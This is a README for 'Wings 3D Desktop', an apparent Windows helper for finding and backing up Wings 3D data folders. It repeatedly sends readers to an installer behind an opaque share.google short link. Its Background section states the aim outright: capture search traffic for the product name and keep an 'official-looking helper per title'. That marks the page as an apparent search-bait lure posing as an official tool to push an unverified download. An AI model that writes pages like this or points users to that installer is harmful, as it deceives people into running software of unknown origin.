![Wings 3D Desktop](assets/hero.png)

# Wings 3D Desktop

*Find the Wings 3D folder fast and keep a local spare.*

## What Wings 3D Desktop is

This repository is **Wings 3D Desktop**, a Windows utility. Find the Wings 3D folder fast and keep a local spare.

Patches move Wings 3D data paths without warning.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## How to get it

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Features

- Locates Wings 3D user data on Windows and macOS.
- Archives data folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## Background

Search traffic for Wings 3D is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Install

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/gary-perez-01/wings-3d-desktop

MIT license. See `LICENSE`.
